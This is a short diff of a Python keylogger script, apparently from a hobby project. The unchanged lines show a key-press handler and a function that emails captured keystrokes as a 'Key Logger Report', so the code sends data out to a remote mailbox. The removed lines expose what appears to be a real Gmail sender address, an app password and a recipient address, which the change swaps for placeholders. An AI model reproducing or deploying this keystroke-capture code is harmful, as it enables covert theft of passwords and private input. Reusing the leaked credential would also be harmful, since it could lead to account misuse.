@@ -17,11 +17,11 @@ def on_press(key):
         email(keys)
 
 def sendmail(message):
-        gmail_user = 'projectkeylogger8@gmail.com'
-        gmail_app_password='esinzfkembjctprl'
+        gmail_user = 'sender mail id'
+        gmail_app_password='Two step verification password'
 
         sent_from = gmail_user
-        sent_to = ['dsathyanarayana2004@gmail.com']
+        sent_to = ['enter the receiver mail id']
         sent_subject = "Key Logger Report"
         sent_body = message
 
